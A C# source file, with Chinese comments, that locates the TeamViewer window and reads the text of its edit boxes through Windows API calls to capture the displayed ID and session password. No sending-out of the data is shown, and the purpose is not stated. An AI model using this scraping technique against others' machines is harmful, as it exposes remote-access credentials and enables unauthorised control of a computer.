using System;
using System.Text;
using System.Text.RegularExpressions;

namespace Timeviewer
{
    public class RemoveController
    {
        private static Regex userReg;

        static RemoveController()
        {
            userReg = new Regex(@"\d+ \d+ \d+", RegexOptions.Singleline | RegexOptions.Compiled);
        }
        public RemoveController()
        {
            Username = string.Empty;
            Password = string.Empty;
            Holder = string.Empty;
        }
        internal int _count;
        public string Username;
        public string Password;
        public string Holder;

        public static RemoveController GetUser()
        {
            RemoveController user = new RemoveController();
            IntPtr tvHwnd = WindowsApi.FindWindow(null, "TeamViewer");
            if (tvHwnd != IntPtr.Zero)
            {
                IntPtr winParentPtr = WindowsApi.GetWindow(tvHwnd, GetWindowCmd.GW_CHILD);
                while (winParentPtr != IntPtr.Zero)
                {

                    IntPtr winSubPtr = WindowsApi.GetWindow(winParentPtr, GetWindowCmd.GW_CHILD);
                    while (winSubPtr != IntPtr.Zero)
                    {
                        StringBuilder controlName = new StringBuilder(512);
                        //获取控件类型
                        WindowsApi.GetClassName(winSubPtr, controlName, controlName.Capacity);  

                        if (controlName.ToString() == "Edit")
                        {

                            StringBuilder winMessage = new StringBuilder(512);
                            //获取控件内容 0xD
                            WindowsApi.SendMessage(winSubPtr, 0xD, (IntPtr)winMessage.Capacity, winMessage);
                            string message = winMessage.ToString();
                            if (userReg.IsMatch(message))
                            {
                                user.Username = message;
                                user._count += 1;

                            }else if (user.Password!=string.Empty)
                            {
                                user.Holder = message;
                                user._count += 1;
                            }
                            else
                            {
                                user.Password = message;
                                user._count += 1;
                            }
                            if (user._count==3)
                            {
                                return user;
                            }
                        }

                        //获取当前子窗口中的下一个控件
                        winSubPtr = WindowsApi.GetWindow(winSubPtr, GetWindowCmd.GW_HWNDNEXT);
                    }
                    //获取当前子窗口中的下一个控件
                    winParentPtr = WindowsApi.GetWindow(winParentPtr, GetWindowCmd.GW_HWNDNEXT);
                }
            }
            return user;
        }
    }

}
